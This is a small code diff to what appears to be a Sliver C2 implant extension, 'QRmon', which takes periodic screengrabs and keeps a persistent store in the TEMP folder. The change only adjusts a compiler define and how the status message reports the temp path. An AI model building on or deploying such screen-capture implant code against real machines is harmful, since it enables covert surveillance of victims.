@@ -1,3 +1,4 @@
+#define _CRT_SECURE_NO_WARNINGS
 #include "WinMsgHandler.h"
 
 // Sliver Extension callback definition
@@ -71,7 +72,7 @@ extern "C" __declspec(dllexport) int __cdecl monitor(char* argsBuffer, uint32_t 
 				_queue = std::make_shared<SharedQueue>();
 				winPump = std::make_unique<std::thread>(&startWinPump);
 
-				std::string msg{ "QRmon started, "+ std::to_string(MIN_TIME_QR_REST)+" seconds minimum resting beetwen two screengrabs, persistent store in %TEMP%\\"+ TMP_FILE_NAME };
+				std::string msg{ "QRmon started, "+ std::to_string(MIN_TIME_QR_REST)+" seconds minimum resting beetwen two screengrabs, persistent store in "+ std::getenv("TEMP")+"\\"+ TMP_FILE_NAME };
 				callback(msg.c_str(), msg.length());
 			}
 			break;
